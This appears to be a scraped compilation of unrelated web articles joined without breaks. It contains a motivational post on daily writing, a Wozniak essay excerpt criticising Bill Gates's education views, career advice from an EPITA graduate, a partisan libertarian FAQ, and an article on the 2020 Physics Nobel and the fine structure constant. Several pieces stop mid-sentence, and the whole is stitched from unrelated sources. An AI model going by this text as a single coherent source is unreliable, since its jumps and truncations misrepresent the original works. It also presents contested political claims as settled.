<p>If you think that dreams are for people that don’t get things done, then I agree with you. But while writing, we all start dreaming just like when we were young. It is a natural process to think about what we want to achieve and where we are going.</p>
<p>Writing not only helps us to understand our goals, but it also helps us get a full plan on how to achieve that goal.</p>
<p>Every time I am procrastinating, instead of doing something that obviously will take me further away from my goal, I start writing about what the goal and the task is. What it requires from me to do it. Why I want to do it and the detailed plan of small steps that I have to take. </p>
<p>Let’s look at the example—this blog.</p>
<p>I have barely coded anything in my life before this. If I were told to build this website from scratch straight away, I would have laughed to your face. It was an impossible task for me. How did I do it? </p>
<p>The whole process was broken down into tiny tasks, so small that I actually couldn’t even <a href="https://klimy.co/blog/how-to-succeed-in-life-online-in-2020">procrastinate about them</a>. They were so obvious and easy to do that I could just do them every day, with no exception.</p>
<p>Out of everyday work, something great can develop. Out of this habit came this website and I am to this day very proud of that.</p>
<p>As with everything, many tasks require a long process of doing the task repeatedly. If you are thinking of having a better life, writing can play a major role in that. You don’t have to start huge. Start small. </p>
<p>Write a word, then a sentence and then a paragraph. If you don’t want to continue, no problem, <a href="https://klimy.co/blog/the-world-doesnt-stop-when-you-are-tired">stop</a>. But make sure to come back tomorrow and do the writing again, no less than today. Over time one paragraph will become 2 and then later an article that you could share.</p>
<p>Start now. Get perfect later.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This text is part of: "<i><a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">I would never send my kids to school</a></i>" by <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2017)</small>
</p>


<h2><span id="Bill_Gates_is_my_hero">Bill Gates is my hero</span></h2>
<p>Bill Gates was an early guiding light and <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">our</a> inspiration. When <a href="https://supermemo.guru/wiki/Krzysztof_Biedalak" title="Krzysztof Biedalak">Krzysztof Biedalak</a> and I made our first $3 investment in a corporate rubber stamp, which was a post-communist obligation for all companies in Poland in 1991, Microsoft was a multibillion-dollar company. How could we not have been blinded by inspiration? We wanted to write a universally useful piece of software and the world would be ours - we thought. Bill Gates's software philosophy, based on respect for backward compatibility, sheltered <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> on its path to its painfully slow adoption. Software and database compatibility have been preserved for 30 years now. My first pieces of knowledge in medical sciences, typed in on Dec 13, 1987, are still there in my collection, well-memorized and useful. Without Gates and his stance on compatibility, I would have lost all that knowledge to some upgrade hiccup long ago. When Gates moved to philanthropy, he has secured his place on my list of the greatest people who ever walked this planet. Perhaps as many as <a href="https://supermemo.guru/wiki/Bill_Gates_saved_over_100_million_children" title="Bill Gates saved over 100 million children">30-120 million kids have been saved by Bill's foundation</a>. This begs a vital question: Why is Gates so awfully wrong about education? Why does he fall for the same old myth that <a href="https://supermemo.guru/wiki/Myth:_You_can_improve_education_by_throwing_more_money_in_it" title="Myth: You can improve education by throwing more money in it">investing in education will produce better outcomes</a>? The education system is wrong and it must be redesigned. <a href="https://supermemo.guru/wiki/Compulsory_schooling_must_end" title="Compulsory schooling must end">Compulsory schooling must end</a>. See: <a href="https://supermemo.guru/wiki/Grand_Education_Reform" title="Grand Education Reform">Grand Education Reform</a>
</p>
<h2><span id="Could_Bill.27s_great_mind_be_wrong.3F">Could Bill's great mind be wrong?</span></h2>
<p>Everyone who disagrees with a great mind needs to pause and re-examine. Gates got sensational credentials. He sports a genius mind. He has seen more places that I could possibly ever manage to visit in Google Maps. He has spoken to more great people than I have had a chance to read about. He has visited more schools that I have seen on pictures. He started his forays into education in 1999. In contrast, I started thinking about "the system" only in 2016 when getting ready to write this <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">book</a>. This makes me into a fledgling with an immature point of view. Gates himself is a great example of a brisk student who has turned his skills and talents into a monumental achievement. His credentials are so much better than mine!
</p>
<h2><span id="Bill_Gates.27s_perspective">Bill Gates's perspective</span></h2>
<p>Could this just be that Gates's perspective is so much different than mine?
</p><p>He looks at the education system like at the operating system. Measure the performance, look for bottlenecks in the system, fix the parameter here and there, videotape a great teacher, and make others copy the method, and manufacture greatness.
</p><p>He looks at education like a philanthropic job. Like he treats health problems with mass vaccinations, he looks for a simple formula which could improve the education of the masses with some industrial move? He seems less focused on letting the brightest thrive, and more focused on preventing the weakest from dropping out. He wants to bring up the average using some <a href="https://supermemo.guru/wiki/Testing" title="Testing">standardized testing</a> approach.
</p><p>He looks at education like a big company that needs to be managed effectively with departments, and sub-departments. With a clear division of responsibility. <a href="https://supermemo.guru/wiki/Modern_schooling_is_like_Soviet_economy#Schooling_is_like_Soviet_Economy" title="Modern schooling is like Soviet economy">With an industrial goal in mind?</a>
</p><p>Could this be that this great capitalist shows more socialist thinking than a little well-indoctrinated ex-communist like myself?
</p><p>There is a different perspective of an employer and an employee, esp. in a creative position. Gates looks at the number of college graduates. I look for specific skills and creative powers. Actual degrees do not matter much if you take time to get into a particular brain.
</p><p>He looks at students like productive workers. The heretic idea of a longer school day must have come from the factory model thinking. Longer days, more production, more manufacturing.
</p><p>He looks at education from a societal point of view, while I look at the brain of an individual. He wants to move the masses to high achievement, while I want to produce more little Bill Gateses.
</p><p>Unlike myself, Bill Gates does not focus on having more Bill Gateses. He focuses on helping the poor, in boosting qualifications of the middle class, and adds "<i>you can't run a society on top 5%</i>". He is right, however, that top 5% can forge a path in education that would inspire all the rest. They cannot be run through a compulsory system set on pushing through the remaining 95%.
</p><p>Gates's approach would be great for some poorer countries (e.g. in Africa). Where there are no schools, industrial approach and good management could quickly improve health, eliminate poverty, and provide basic education.
</p><p>My approach is probably more suited to well-developed nations where the industrial approach makes people sick of schooling. With social awareness and education on the rise, we look for more little future Noble Prize winners and future Bill Gateses.
</p><p>His own kids get the best kind of learning. During his trips around the world, they get to visit places like the Large Hadron Collider at CERN. This could spark a life-long passion that could turn them into future particle physicists or another incarnation of <a href="https://supermemo.guru/wiki/Tim_Berners-Lee" title="Tim Berners-Lee">Tim Berners-Lee</a>.  
</p><p>Where Gates optimizes for improving the average, I am looking for the optimum of peak intellectual performance.
</p><p>Last but not least, could Gates's approach be an afterglow of his dropping out from Harvard. I see that over and over again, dropouts seem to suffer from this life-long hangover about what could have been? They tend to over-appreciate the power of schooling or the power of college. In the same way, I might be under-appreciating my own degrees. Gates is <a href="https://supermemo.guru/wiki/Thiel_on_competition_for_degrees" title="Thiel on competition for degrees">the opposite of Peter Thiel</a> who studiously climbed the educational ladder until he stumbled to see the light. Thiel is now one of the staunchest critics of college.
</p>
<h2><span id="Bill_Gates.27s_formula_for_success">Bill Gates's formula for success</span></h2>
<p>I see Gates's own life as a simple formula for success in science, engineering, or life in general:
</p>
<ul><li> healthy childhood of few concerns (preferably without the relegation to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>)</li>
<li> healthy approach to schooling with pranks, rebellions, disobedience, and freedom </li>
<li> minor trajectory nudges within the <a href="https://supermemo.guru/wiki/Push_zone" title="Push zone">push zone</a> by inspirational tutors. If tutors are not parents, this might be the most expensive part of the formula</li>
<li> breakthrough passion, e.g. for tinkering with computers or software</li>
<li> healthy education, possibly interrupted by some breakthrough decision (e.g. <i>Let me drop out from Harvard to set up the greatest software company in the world</i>)</li>
<li> relentless lifelong pursuit of goals born from that <a href="https://supermemo.guru/wiki/Passion_and_memory" title="Passion and memory">youthful passion</a></li>
<li> voracious reading (see: <a href="https://supermemo.guru/wiki/Bill_Gates_and_his_non-incremental_reading" title="Bill Gates and his non-incremental reading">Bill Gates and his non-incremental reading</a>)</li></ul>
<p>Only Bill Gates truly knows it, but my understanding of his life story is that his future was determined by just one major factor: getting his hands on a computer. He was good at math and programming. So are dozens of kids in my neighborhood. My thinking comes from the fact that I was also strongly affected by my first contact with computers.
</p>

<p>When <a href="https://supermemo.guru/wiki/First_steps_of_SuperMemo" title="First steps of SuperMemo">I got my first computer in 1986</a>, ZX Spectrum, I was 24 and experienced wild elation with computer's obedience in executing my commands. I told the computer what to do, and it did it perfectly without asking questions. That was wonderful. I started writing my <a href="https://supermemo.guru/wiki/Plan" title="Plan">program for planning my day</a> on paper long before I got the computer on my desk. I was eager to see it work! As ZX Spectrum would load programs from a cassette tape, I could not easily dream of having <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>. It needed access to some disk drive. I got my first PC with a 360 KB <a href="https://en.wikipedia.org/wiki/Floppy_disk">floppy disk</a> drive only <a href="https://supermemo.guru/wiki/SuperMemo_1.0_for_DOS_(1987)" title="SuperMemo 1.0 for DOS (1987)">in 1987</a></p>
<p>The above hypothetical formula for educational success is simple and effective. Only a few might ever dream to replicate the scope of Bill's success. If that formula does not bring serial Nobel Prize winners, it should at least bring up a great deal of happy and fulfilled individuals. Freedom to explore the world is essential and it is denied to a great deal of kids in the modern world. When Peter Thiel pays kids to drop out from college, he looks for this type of free thinking experience that can change one life and then can change the world.
</p>
<h2><span id="My_attempt_at_employing_Gates.27s_formula">My attempt at employing Gates's formula</span></h2>

<p>I am happy with <a href="https://supermemo.guru/wiki/Exponential_adoption_of_spaced_repetition" title="Exponential adoption of spaced repetition">my achievements in life</a>. I have followed the formula employed by Gates. However, there were some exceptions. Perhaps I could use them as an excuse for not being as wildly successful as Bill? I was sent to <a href="https://supermemo.guru/wiki/Daycare_misery" title="Daycare misery">daycare</a>, and I am sure this slowed down my development. The time I spent with my brother was more intellectual and inspirational by two orders of magnitude. However, he was a student and could not babysit the little me for ever. In later years, I was forced into a degree of conformity by an ever-present threat of being enlisted by the army in service of the Warsaw Pact. In 1986, I was finally free of the army service, and could finally drop out, however, I was not ready. There was no market economics culture in Poland of the 1980s. I read about entrepreneurial science in Science in 1989 (Oct 31, 1989). This was the first time when it occurred to me that my research into memory might actually be a seed of a business. Initially, though, my passions led me in the direction of a PhD. Schooling told me that science done by entrepreneurs is inferior to science done in academia. I thought of <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a> as an opportunity to earn money for a trip to America. It seems that while Gates was fast to mature as a little entrepreneur, I needed 28 long years to even start thinking of my <a href="https://supermemo.guru/wiki/SuperMemo_World" title="SuperMemo World">own business</a>.</p>
<h2><span id="Reconciling_Gates_and_Woz">Reconciling Gates and Woz</span></h2>
<p>Gates wants better teachers, better education, verification, <a href="https://supermemo.guru/wiki/Testing" title="Testing">testing</a>, measuring, carrot-and-stick for teachers, etc. In contrast, I stand with Steve Jobs. Jobs told the kids to <a href="https://supermemo.guru/wiki/Fundamental_law_of_learning" title="Fundamental law of learning">rebel</a>!
</p><p>Gates believes that the key to the <a href="https://supermemo.guru/wiki/Reform" title="Reform">great future education system</a> is the teacher. He is almost right. If we could populate present schools with great teachers, I wouldn't ever need to write <a href="https://supermemo.guru/wiki/Problem_of_Schooling" title="Problem of Schooling">this book</a>. The problem is that <a href="https://supermemo.guru/wiki/Progressive_education" title="Progressive education">a great teacher is simply a truly great man</a>. Great teaching requires a degree of genius. We need millions of those great people. How can we possibly hope to produce hundreds of thousands …</p></div></div>

        <p>In 2018, I graduated from <a href="https://en.wikipedia.org/wiki/%C3%89cole_pour_l%27informatique_et_les_techniques_avanc%C3%A9es">EPITA</a>, a french engineering “Grande École” specialized in computer science. The subjects I had treated there were very technical: from the implementation of an ISO file reader to a <a href="https://www.lrde.epita.fr/~tiger/tiger.html">Tiger compiler</a>.</p>

<p>The technical focus, taught in technical programs such as my engineering school, has led me to some small surprises during my first steps in the business world. The following list outlines what I would have liked to have learned before graduation. The article is obviously influenced by computer science, which is the specialty of my school. Nevertheless, I hope that the students will find some teaching in it, whatever the technical field they are targeting.</p>



<h2 id="human-is-the-new-challenge">Human is the New Challenge</h2>

<p>Coming from a school whose implicit motto was “the more technical, the better”, I had to quickly get used to the idea that the new technicality coming out of school was primarily human. Don’t make me wrong: having technical knowledge is as necessary as expected by the business world. But if many of us have been trained to take up technical challenges, we have been much less prepared for the strangeness of human behavior.</p>

<blockquote>
  <p>Technical skills should no longer be your challenge, your challenge should now be human.</p>
</blockquote>

<p>Schopenhauer said in The Art of Being Right “<em>A man may be objectively in the right, and nevertheless in the eyes of bystanders, and sometimes in his own, he may come off worst</em>” which in our case could be perfectly translated as “<em>You may be technically right and yet not be supported by others.</em>”. Sometimes engaging technical decisions are taken on the basis of very non-technical arguments, for example:</p>
<ul>
  <li>you were sick on the day of an important meeting;</li>
  <li>your level in English is not good enough to argue well enough;</li>
  <li>your manager used to work at XYZ, therefore XYZ technology is chosen for the project;</li>
  <li>your ambition to change a design frightens the rest of the team, despite the little amount effort it actually requires;</li>
  <li>your colleague X doesn’t like you, therefore it doesn’t like your design;</li>
  <li>etc.</li>
</ul>

<p>The list is endless. Just keep in mind that if you want technical decisions to be accepted, you will have to arm yourself with skills that go well beyond technique, starting with <em>negotiation</em> for example.</p>



<p>The school doesn’t just train engineers in languages or tools, it establishes a culture and a discipline that becomes stronger or weaker by joining a firm. Depending on the business sector, company, project or team, not everyone gives the same attention to software engineering. It is very unlikely that this discipline is the core business of your company, nor even the academic background of your colleagues. The good practices, taken for granted, can then be violently disrupted: no code review, no unit tests, sometimes even no version-control tool.</p>

<p>The intuitive reflex of a young engineer is to bring a purely technical solution: no version-control tool? let’s install git! No code review? Let’s protect the master branch! No unit tests? Install the right testing library! Etc. But here we are, the problem is <em>not</em> technical, the problem is primarily human, more particularly cultural. Changing the corporate culture, or more modestly, <em>the culture of a team is far more difficult to change than any tool</em>.</p>

<p>I will always remember the long struggle to get GitLab for an old project. This was the kind of indispensable work tool for a software engineer. The battle was long, not because the tool did not exist (it just had to be downloaded and installed) but because the required culture was not ready.</p>

<p>It takes time and effort to change a culture, but it is well worth the effort. A tool can always be dropped, a <code>git push</code> can always be forced, but a disciplined team is hardly swindled. So when choosing between a very well equipped team and a very disciplined team, <em>choose discipline without hesitation</em>!</p>

<h2 id="professional--genius">Professional &gt; Genius</h2>

<p>In university, a lot of credit was given to geniuses who, alone, could compile a few thousand lines of complicated code in a single night’s work. When I entered the business world, my vision changed a lot from that kind of profile, capable of doing a lot of work in record time. Their confidence (or arrogance) leads to an extra commitment, which makes it difficult to meet delivery deadlines. And because geniuses understand complex things, they <a href="https://reflexio.debec.eu/principles-for-better-design#keep-it-simple-stupid">design complex systems</a> that no one understands. Their loneliness makes them unique masters of their subjects, thereby nurturing their self-esteem. Knowledge remains in their heads and their presence becomes necessary for every decision.</p>

<p><a href="https://armament.solutions/tactics/single-points-of-failure.html"><img src="https://reflexio.debec.eu/assets/single_point_of_failure.svg" alt="Single point of failure"></a></p>

<p>But geniuses also have 24-hour days and quickly turn out to be the <em>bottleneck</em> of everything, slowing down everyone else. You don’t need to be a software architecture expert to agree that it is not desirable to over-commit and underestimate a single resource: apart from the inability to scale, the resource is the single point of failure. <a href="https://en.wikipedia.org/wiki/Single_point_of_failure">The design of a single point of failure is unforgivable</a>. Once the engineer gets sick, goes on vacation, or leaves the company, the entire team will have to pay back months or even years of unprofessionalism.</p>

<p>It is a black and exaggerated portrait that I paint here. I can nevertheless bet that you will encounter this kind of profile in your career which, in addition to having a negative impact on entire projects (and on people’s health), will sometimes be claimed as a hero by the organization. <em>Real geniuses are the geniuses also capable of <a href="https://reflexio.debec.eu/principles-for-better-design#keep-it-simple-stupid">designing simplicity</a>, taking people on board while humble towards humanity and their workload</em>. These are called great professionals. They spread knowledge and responsibility in order to become not the single point of failure or the bottle neck.</p>

  <div itemprop="articleBody">
    <p><em>This post was co-authored with <a href="https://twitter.com/ChipkinLogan">Logan Chipkin</a>.</em></p>

<p>Some responses to the most common criticisms of and questions about libertarianism. To reference, click on a heading. Feel free to share.</p>

<p>There’s a glossary at the bottom.</p>

<h3><a href="#who-would-build-roads" name="who-would-build-roads">Who would build roads if there was no government?</a></h3>

<p>The same people who build them now, only they’d be paid directly by those who actually use them. When the government owns the roads, all taxpayers bear the burden, even if they’d prefer not to consume the roads. This results in overconsumption of roads, since consumption has been forcibly severed from payment by the consumer. This is a special case of the more general tragedy of the commons that results from government illegitimately claiming ownership of some good or service that the government offers for public consumption.</p>

<h3><a href="#how-would-you-settle-disputes" name="how-would-you-settle-disputes">How would you settle disputes between people? In other words: how would the legal system work?</a></h3>

<p>It’s worth noting that citizens under different national governments already settle disputes with each other, and there is not (yet) a global government. So, people have already solved the problem of how to settle disputes despite being subject to different systems of law (coercively).</p>

<p>Secondly, despite the government’s imposed monopoly on legislation and its system of courts that cannot possibly go out of business no matter how much people do not want to purchase its services, people <em>still</em> find private alternatives (namely, out-of-court dealings and private arbitration services) to resolve their conflicts.</p>

<p>In an anarcho-capitalist society, a company can only earn a profit by persuading people to purchase its goods or services. In this case, the service that people want is reliable adjudication between interpersonal disputes. If two parties find themselves in a conflict that they cannot privately resolve, they may shop around for a court that both parties find fair and cost-effective.</p>

<p>Alternatively, the parties may have purchased insurance that covers whatever conflict they now find themselves in. In that case, the insurance agencies, if different, have an interest in resolving the dispute such that both of their reputations remain intact. Should either insurance agency refuse to pay out/cover the damages, no one would trust them enough to do business with them ever again.</p>

<p>Depending on how developed the economy is, these insurance agencies may have predetermined agreements with each other about which court to which they will present their clients’ disputes.</p>

<h3><a href="#what-about-the-police" name="what-about-the-police">What about the police?</a></h3>

<p>People could purchase private security.</p>

<h3><a href="#the-poor-could-not-call-the-police" name="the-poor-could-not-call-the-police">So the poor couldn’t call the police?</a></h3>

<p>Yes, they could. There could be charity, support networks, credit, etc. Also, free-market security companies have incentives to be much cheaper than the police, because they can go bankrupt, whereas the police can’t. Ironically, poor neighborhoods are often chronically underserved by the police already, whereas private security companies could enter such neighborhoods by offering low prices.</p>

<p>Shoes are a good free-market example. Virtually everyone needs them, and poor people do not struggle to purchase them. The same mechanisms of innovation and competition would yield affordable and quality security services to them, as well.</p>

<h3><a href="#healthcare" name="healthcare">What about healthcare?</a></h3>

<p>See police.</p>

<h3><a href="#foreign-invaders" name="foreign-invaders">What about foreign invaders?</a></h3>

<p>Eventually, private security and insurance.</p>

<h3><a href="#move-to-somalia" name="move-to-somalia">Why don’t you just move to Somalia?</a></h3>

<p>This is a silly suggestion that people like to make, implying that a libertarian society would be a lawless society. But that’s just not the case. Libertarians want rules, and consequences for those who break them. What libertarians don’t want is to be subjected to coercion. The rejection of coercion does not imply the rejection of rules.</p>

<p>Additionally, there is more to civilization than the size of government. The culture of a civilization and its level of wealth are at least as important with respect to its ability to correct errors and allow for progress.</p>

<p>Finally, mankind was born into utter poverty: at the dawn of our species, life really was ‘solitary, poor, nasty, brutish, and short’. So it is the existence of wealth that requires explanation, not poverty. Why is the United States wealthier than it was one-hundred years ago? Was wealth created by the growth of its government? Similarly, would Somalia become wealthier if some of them coercively acquired wealth from the rest of them?</p>

<h3><a href="#theft-and-murder" name="theft-and-murder">If there’s no force/coercion, doesn’t that mean people would be free to steal and commit murder?</a></h3>

<p>No. A libertarian society would still punish crimes. There is a difference between the initiation of force and the use of force in defense against those who initiate force. A libertarian society, by definition, would not tolerate any initiation of force, but the use of force in defense would be allowed. Therefore, crimes would still be investigated and prosecuted. There wouldn’t be <em>no</em> force at all.</p>

<h3><a href="#isnt-capitalism-evil" name="isnt-capitalism-evil">Isn’t capitalism evil?</a></h3>

<p>Capitalism just means that people who want to work together voluntarily get to do so unhindered, and that those who want to be left alone are, in fact, left alone. There’s nothing evil about that. What <em>is</em> evil is when a parasite like the government mooches off of that peaceful interaction.</p>

<h3><a href="#doesnt-capitalism-need-government-for-balance" name="doesnt-capitalism-need-government-for-balance">Doesn’t capitalism need something like a government to counteract and balance it?</a></h3>

<p>You mean counteract and balance the peaceful and voluntary interaction between people? No, that’s not necessary.</p>

<h3><a href="#no-help-for-the-poor" name="no-help-for-the-poor">Does this mean you don’t want poor people to receive any help?</a></h3>

<p>No. People are free to help each other in a libertarian society.</p>

<p>Moreover, governments only hinder the growth of wealth. Global poverty is at an all-time low (or was, before the shutdowns) because people are evermore free to create, trade, and solve problems. No top-down legislation has, or could possibly, create wealth for people who need it.</p>

<h3><a href="#government-as-foundation" name="government-as-foundation">Don’t you need some foundation like the government on which to build and make decisions?</a></h3>

<p>No more than biological evolution needs some blueprint before bringing complex, seemingly-designed structures into reality.</p>

<p>It is impossible for a single person or company to know the problem-situation of millions or billions of other people. An economy is unplanned—objective prices emerge from the local interactions of countless individuals in various problem-situations. No one can determine what a price of some good ‘should be’, and when they try, shortages and inefficiencies result. Similarly, the very processes by which goods and services are created from raw materials is often global in complexity, counterintuitive, and such that no single person knows the entire process (See <a href="https://fee.org/resources/i-pencil/"><em>I, Pencil</em></a> by Leonard Read).</p>

<h3><a href="#protection-from-exploitation" name="protection-from-exploitation">How would you protect employees from exploitation?</a></h3>

<p>Certainly not by initiating exploitation in the first place, which is what governments do when they acquire revenue coercively.</p>

<p>Employees are free to unionize if they think that that might benefit them.</p>

<p>The more employers there are competing for labor, the greater the conditions (wage, working conditions, etc.) will be for employees. This is a special case of a more general principle: competition breeds higher quality. Governments cannot provide a multitude of employers in the market.</p>

<p>Technological innovation increases the productive capacity of a given employee, which increases his bargaining power. Innovation cannot be coerced into existence. Rather, it must be created.</p>

<h3><a href="#protection-from-fraud" name="protection-from-fraud">How would you protect consumers from fraud?</a></h3>

<p>You could file a claim with a private arbitrator (which already exist). There could be private reviewers of companies and products (which already exist). There’s a market opportunity for competition to discourage fraud. And so on. Conversely, the government is the reason we have corporations that get the government to enforce regulations to make it harder for others to enter their market and compete. A libertarian society would be better equipped to deal with fraud, and there would exist no institutionalized discrimination against business.</p>

<h3><a href="#why-is-freedom-important-to-you" name="why-is-freedom-important-to-you">Why is freedom so important to you? Isn't loving and helping other people just as important?</a></h3>

<p>Freedom and helping others are not mutually exclusive. And again, people are free to help each other in libertarian societies. Helping others when you want to and can: great. Being <em>forced</em> to help others whether you want to or not: evil.</p>

<h3><a href="#but-what-about-traffic-rules" name="but-what-about-traffic-rules">But rules are enforced in traffic, so it's okay to coerce people.</a></h3>

<p>It’s truly amazing how many people reach for the traffic thing as a “gotcha,” and how reliably they do. There must be some widespread meme causing this curious phenonemon… In any case, that coercion is okay because traffic rules need to be enforced is a complete non sequitur.</p>

<p>Yes, traffic needs rules. Whoever owns the roads can make those rules and enforce compliance in exchange for letting others use them. This goes back to property rights: he who <em>owns</em> the roads gets to make the rules. The government (sadly) owns the roads, so the government gets to make traffic rules. But government does not own people’s homes, or their bodies, or any other of their property (by definition, or else it wouldn’t be <em>their property</em>), and yet government makes and enforces rules about what people can and cannot do with their property, and robs them of some of it. That’s a gross and immoral overreach. This immorality is the fundamental gap the traffic metaphor doesn’t bridge, and that no argument has ever bridged. Traffic rules have nothing to do with coercion.</p>

<h3><a href="#what-about-externalities" name="what-about-externalities">What about externalities?</a></h3>

<p>1) Even if externalities pose a problem, it is a non sequitur to conclude that only an institution that acquires resources coercively may solve it.</p>

<p>2) Furthermore, because the value derived by one’s environment is subjective (individuated and continuously changing in time), the benefit or cost of externalities as consumed by each individual is impossible to keep track of.</p>

<p>3) Thirdly, if the only way that a given externality is dealt with is via coercion, then, by demonstrated preference, this implies that people would rather …</p></div></article></div></div></div>

			<p><span>T</span>he 2020 Nobel Prize in Physics went to three researchers who confirmed that Einstein’s general relativity predicts black holes, and established that the center of our own galaxy houses a supermassive black hole with the equivalent of 4 million suns packed into a relatively small space. Besides expanding our understanding of black holes, the strong gravitational field around the supermassive black hole is a lab to study nature under extreme conditions. Researchers, including one of the new Nobel Laureates, <a href="http://alliance.nautil.us/article/199/opening-a-new-window-into-the-universe" target="_blank">Andrea Ghez</a> at UCLA, have measured how the intense gravity changes the fine structure constant, one of the constants of nature that defines the physical universe, and in this case, life within it. This research extends other ongoing efforts to understand the constants and whether they vary in space and time.&nbsp;The hope is to find clues to resolve issues in the Standard Model of elementary particles and in current cosmology.</p><figure data-alt="Perkowitz_BREAKER-1"><img src="http://static.nautil.us/17968_916cbd6f20415c2214d441deaefedf75.png" width="733" alt=""><figcaption><span><strong>NOBEL LAUREATE:</strong> Andrea Ghez won science’s biggest prize for her co-discovery of a supermassive black hole in the center of our galaxy. She has also precisely defined the elliptical paths of stars orbiting the galactic center.</span><span>Wikimedia Commons</span></figcaption></figure> <p>Besides Ghez, the other Nobel Laureates honored in 2020 are Roger Penrose at Cambridge University, who deepened our theoretical understanding of black holes; and Reinhard Genzel, of the Max Planck Institute for Extraterrestrial Physics in Garching, Germany. Ghez and Genzel carried out parallel but separate observations and analysis that led each to deduce the presence of our galactic supermassive black hole. At 27,000 light-years away, obtaining good data required huge telescopes. Ghez worked with the Keck Observatory on Mauna Kea in Hawaii, and Genzel used the Very Large Telescope in Chile. Each researcher found that the motion of the stars they observed arose from an enormous mass at the center of the galaxy. They obtained the same value, 4 million times the mass of our sun, in a region only as big as our solar system—definitive evidence of a supermassive black hole.</p><p>Ghez’s research at Keck made her a co-author <a href="https://arxiv.org/abs/2002.11567" target="_blank">in a paper</a> published this year, in which Aurélien Hees of the Paris Observatory and 13 international colleagues presented results for the fine structure constant near our galactic supermassive black hole. Remarkably, Ghez’s Nobel Prize-winning results supporting this research combined today’s theories and astronomical techniques with ideas dating back to Johannes Kepler and Isaac Newton to examine the motion of stars near the supermassive black hole. This is another example of Newton’s insight about how science advances when he wrote in 1675, “If I have seen further it is by standing on the shoulders of giants.”</p><blockquote><p>The constant in the strong gravity near the black hole could be a clue to modifying the Standard Model.</p> </blockquote><p>German astronomer Kepler is one such giant who changed science when he presented his laws of planetary motion in 1609. He was the first to show that the planets do not orbit the sun in divinely inspired perfect circles, as had been assumed. The orbits are ellipses with the sun at a focus of the ellipse, one of the two points symmetrically offset from the center that define how to construct an ellipse. Kepler also found a mathematical relation between the size of a planetary orbit and how long it takes the planet to complete a circuit.<br></p><p>In 1687 Newton gave Kepler’s laws a deeper, more coherent physical basis. Newton’s law of gravitation, based on mutual attraction between bodies, showed that a celestial object in a closed orbit around a mass follows an elliptical path that depends on that mass. This result, which today is taught in introductory astronomy, is the heart of how Ghez found the mass of the supermassive black hole. Her years of careful observations precisely defined the elliptical paths of stars orbiting the galactic center; then she used Newton’s theory to calculate the mass at the center (general relativity, which replaces Newton’s law, predicts black holes but Newton’s approach is sufficiently accurate for the stellar orbits around the supermassive black hole). Knowledge of these orbits would be crucial for measuring the fine structure constant in the strong gravity near the supermassive black hole. How that constant depends on gravity could be a clue to modifying the Standard Model or general relativity to deal with dark matter and dark energy, the two great puzzles of contemporary physics.</p> <p><span>T</span>his particular examination fits into a bigger, long-term examination of the fundamental constants of nature, each of which tells us something about the scope or scale of our deepest theories. Along with other constants, the fine structure constant (denoted by the Greek letter α), appears in the Standard Model, the quantum field theory of elementary particles. The numerical value of α defines how strongly photons and electrically charged particles interact through the electromagnetic force, which controls the universe along with gravity and the strong and weak nuclear forces. Among its effects, electromagnetism determines the degree of repulsion between protons and how electrons behave in an atom. If the value of α were much different from the one we know, that would affect whether nuclear fusion within stars produces the element carbon or whether atoms can form stable complex molecules. Both are necessary for life, another reason α is significant.</p><p>Other constants represent other major physical theories: <i>c</i>, the speed of light in vacuum, is crucial in relativity; <i>h</i>, the constant derived by Max Planck (now taken as “h-bar,” or <i>ħ</i> = <i>h</i>/2<i>π</i>), sets the tiny size of quantum effects; and <i>G</i>, the gravitational constant in Newton’s theory and general relativity, determines how astronomical bodies interact. In 1899 Planck used just these three to define a universal measurement system based on natural properties and not on any human artifacts. This system, he wrote, would be the same “for all times and all civilizations, extraterrestrial and non-human ones.”</p><blockquote><p>It raises the notion that out of many multiverses, the one where we exist is the one with the winning value.</p> </blockquote><p>Planck derived natural units of length, time, and mass from <i>c</i>, <i>ħ</i>, and <i>G</i>: <i>L<sub>P</sub></i> = 1.6 x 10<sup>-35</sup> meters, <i>T<sub>P</sub></i> = 5.4 x 10<sup>-44</sup> seconds, and <i>M<sub>P</sub></i> = 2.2 x 10<sup>-8</sup> kilograms. Too small to be practical, they have conceptual weight. In today’s universe the gravitational interaction between elementary particles is too weak to affect their quantum behavior. But place the bodies a tiny Planck length <i>L<sub>P</sub></i> apart, less than the diameter of an elementary particle, and their gravitational interaction becomes strong enough to rival quantum effects. This defines the “Planck era” 10<sup>-44</sup> seconds after the Big Bang, when gravitational and quantum effects were of similar strength and would require a combined theory of quantum gravity instead of the two separate theories we have today.<br></p><p>Nevertheless, to some physicists, <i>c</i>, <i>ħ</i>, and <i>G</i> are not truly fundamental because they depend on units of measurement. Consider for instance that <i>c</i> is 299,792 km/sec in metric units but 186,282 miles/sec in English units, This shows that physical units are cultural constructs rather than inherent in nature (in 1999, NASA’s Mars Climate Orbiter fatally crashed because two scientific teams forgot to check which measurement system the other had used). Constants that are pure numbers, however, would translate perfectly between cultures and even between us and aliens with unimaginably different units of measurement.</p><p>The fine structure constant α stands out as carrying this favored purity. In 1916 it appeared in calculations for the wavelengths of light emitted or absorbed as the single electron in hydrogen atoms jumps between quantum levels. Niels Bohr’s early quantum theory predicted the main wavelengths but spectra showed additional features. To explain these, the German theorist Arnold Sommerfeld added relativity to the quantum theory of the hydrogen atom. His calculations depended on a quantity he called the fine structure constant. It includes <i>ħ</i>, <i>c</i>, and the charge on the electron <i>e</i>, another constant of nature; and the permittivity <i>ε</i><sub>0</sub>&nbsp; that represents the electrical properties of vacuum. Remarkably, the physical units in this odd collection cancel out, leaving only the pure number 0.0072973525693.</p> <figure data-alt="Perkowitz_BREAKER-2"><img src="http://static.nautil.us/17967_a52357f1ce8160dee6563b6a3391ffa8.png" width="733" alt=""><figcaption><span><strong>GIANT SHOULDERS:</strong> This year’s Nobel winners drew on astronomical techniques dating back to Isaac Newton, who wrote of scientific advances, “If I have seen further it is by standing on the shoulders of giants.”</span><span>Nicku / 